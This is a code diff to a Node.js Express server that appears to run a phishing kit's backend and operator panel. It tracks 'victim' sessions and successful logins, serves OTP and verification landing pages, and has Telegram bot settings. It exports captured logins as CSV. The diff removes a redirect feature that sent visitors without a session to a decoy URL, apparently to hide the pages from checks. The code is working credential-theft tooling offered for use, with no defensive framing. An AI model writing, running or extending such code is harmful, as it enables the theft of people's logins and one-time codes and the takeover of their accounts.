@@ -2,15 +2,12 @@ const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
 const https   = require('https');
-
 const PANEL_USER     = process.env.PANEL_USER  || 'astro';
 const PANEL_PASS     = process.env.PANEL_PASS  || '1';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
-
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
-
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
@@ -169,32 +166,12 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-let defaultRedirectUrl = '';
-const VALID_LANDING_PAGES = ['index.html', 'welcome.html', 'verify.html', 'otp.html', 'auth.html', 'recovery.html', 'verification.html'];
-
 app.use((req, res, next) => {
   const host  = req.headers.host || req.hostname;
   const proto = req.headers['x-forwarded-proto'] || req.protocol;
   currentDomain = host.includes('localhost')
     ? `http://localhost:${PORT}`
     : `${proto}://${host}`;
-  next();
-});
-
-app.use((req, res, next) => {
-  if (req.method !== 'GET') return next();
-  
-  const path = req.path.replace('/', '');
-  
-  if (VALID_LANDING_PAGES.includes(path) && defaultRedirectUrl) {
-    const sessionData = getSessionCookie(req);
-    const sid = req.query.sid || sessionData?.victimSid;
-    
-    if (!sid || !sessionsMap.has(sid)) {
-      console.log(`[Redirect] ${path} → ${defaultRedirectUrl} (no active session)`);
-      return res.redirect(302, defaultRedirectUrl);
-    }
-  }
   next();
 });
 
@@ -269,36 +246,6 @@ app.post('/panel/logout', (req, res) => {
 
 app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
-app.get('/api/settings/redirect', (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-  res.json({ 
-    redirectUrl: defaultRedirectUrl,
-    isActive: !!defaultRedirectUrl,
-    affectedPages: VALID_LANDING_PAGES
-  });
-});
-
-app.post('/api/settings/redirect', (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-  
-  const { url, enabled } = req.body;
-  
-  if (enabled === false || url === '' || url === null) {
-    defaultRedirectUrl = '';
-    console.log('[Settings] Default redirect disabled, using native pages');
-    return res.json({ success: true, redirectUrl: '', isActive: false });
-  }
-  
-  try {
-    new URL(url);
-    defaultRedirectUrl = url;
-    console.log('[Settings] Default redirect set to:', url);
-    res.json({ success: true, redirectUrl: url, isActive: true });
-  } catch (e) {
-    res.status(400).json({ error: 'Invalid URL format' });
-  }
-});
-
 app.post('/api/session', async (req, res) => {
   try {
     const sid = crypto.randomUUID();
@@ -332,10 +279,7 @@ app.post('/api/session', async (req, res) => {
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
-    res.json({ 
-      sid,
-      redirectUrl: defaultRedirectUrl ? `${currentDomain}/index.html?sid=${sid}` : null 
-    });
+    res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
     res.status(500).json({ error: 'Failed to create session' });
@@ -520,12 +464,7 @@ function buildPanelPayload() {
     waiting:      list.filter(x => x.status === 'wait').length,
     success:      successfulLogins,
     sessions:     list,
-    logs:         auditLog.slice(-50).reverse(),
-    redirectSettings: {
-      url: defaultRedirectUrl,
-      isActive: !!defaultRedirectUrl,
-      affectedPages: VALID_LANDING_PAGES
-    }
+    logs:         auditLog.slice(-50).reverse()
   };
 }
 
@@ -695,7 +634,7 @@ app.get('/api/export', (req, res) => {
     ...successes.map(s => Object.values(s).map(v => `"${v}"`))
   ].map(r => r.join(',')).join('\n');
   res.setHeader('Content-Type', 'text/csv');
-  res.setHeader('Content-Disposition', 'attachment; filename="$$$.csv"');
+  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
   res.send(csv);
 });
 
